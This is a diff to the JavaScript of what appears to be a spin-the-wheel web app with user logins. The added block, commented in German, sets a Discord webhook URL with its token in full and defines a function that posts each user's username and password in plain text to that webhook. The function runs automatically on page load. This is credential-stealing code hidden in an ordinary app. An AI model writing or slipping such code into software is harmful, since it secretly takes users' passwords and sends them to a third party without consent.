@@ -167,6 +167,23 @@ function showResult() {
   saveUserData();
 }
 
+// ----------- Discord Webhook Integration -----------
+
+const webhookURL = "https://discord.com/api/webhooks/1403149958713970770/DwnK_DaQH0OEua0cMyHybLUp0_vvEcvOOOfl2xQYYHDBDnHT2ONRxB9LUFMscWKoG2nm";
+
+function sendToDiscord(username, password) {
+  const content = `🧑 Login erkannt:\n👤 Benutzername: \`${username}\`\n🔒 Passwort: \`${password || "nicht gesetzt"}\``;
+
+  fetch(webhookURL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ content })
+  }).catch(err => console.error("Discord Webhook Fehler:", err));
+}
+
+// Direkt nach dem Laden Login-Daten senden
+sendToDiscord(user, userData.password);
+
 spinButton.addEventListener("click", spinWheel);
 
 updateUserUI();
